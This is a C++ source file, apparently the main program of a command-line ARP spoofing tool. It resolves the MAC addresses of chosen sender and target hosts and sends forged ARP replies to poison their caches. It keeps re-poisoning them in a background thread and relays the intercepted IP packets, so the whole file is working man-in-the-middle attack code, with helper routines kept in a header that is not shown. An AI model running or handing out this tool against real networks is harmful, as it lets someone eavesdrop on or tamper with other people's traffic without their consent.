#include "arp-spoof.h"

Mac myMac;
Ip myIp;
pcap_t* handle;
Ip sender_ip;
Mac sender_mac;
Ip target_ip;
Mac target_mac;

std::map<Ip, Mac> ArpTable;
std::map<Ip, Ip> Send2Tar;


void usage(char* argv[]){
    printf("syntax : %s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n", argv[0]);
    printf("sample : %s wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n", argv[0]);
}

int main(int argc, char* argv[])
{
    // usage
    if (argc < 4 || argc%2 != 0){
        usage(argv);
        return -1;
    }

    // pcap handle initialize
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    
    // get my IP/MAC Address
    myMac = GetMyMac(dev);
    myIp = GetMyIp(dev);
    
    // logging
    std::cout << "[!] My        Mac :" << std::string(myMac) << "\n";
    std::cout << "[!] My        IP  :" << std::string(myIp) << "\n";

    for (int i = 0; i < (argc-2)/2; i++)
    {
        // get sender IP/MAC address 
        sender_ip = Ip(argv[2 + 2*i]);
        if( ArpTable.find(sender_ip) == ArpTable.end() )  {
            sender_mac = GetMacfromIp(handle, sender_ip);
            ArpTable[sender_ip] = sender_mac;
        }
        else sender_mac = ArpTable[sender_ip];

        // information logging
        std::cout << "[" << i << "] sender    Mac :" << std::string(sender_mac) << "\n";
        std::cout << "[" << i << "] sender    IP  :" << std::string(sender_ip) << "\n";

        // get target IP/MAC address 
        target_ip = Ip(argv[3 + 2*i]);
        if( ArpTable.find(target_ip) == ArpTable.end() )  {
            target_mac = GetMacfromIp(handle, target_ip);
            ArpTable[target_ip] = target_mac;
        }
        else target_mac = ArpTable[target_ip];

        // information logging
        std::cout << "[" << i << "] target    Mac :" << std::string(target_mac) << "\n";
        std::cout << "[" << i << "] target    IP  :" << std::string(target_ip) << "\n";

        Send2Tar[sender_ip] = target_ip;
    }

    // ARP infection
    for (auto& ip2ip : Send2Tar)
    {
        SendArpInfectPkt(handle, ip2ip.first, ArpTable[ip2ip.first], ip2ip.second, ARP_REP_TYPE);
    }
    
    // sighandler
    // SIGINT
    signal(SIGINT, SigINTHandler);

    // arp infection
    std::thread infect_thread(PeriodicInfection, handle, Send2Tar, ArpTable);

    // IP Packet Relay    
    IpPacketRelay(handle, Send2Tar, ArpTable);
    
    infect_thread.join();

    return 0;
}
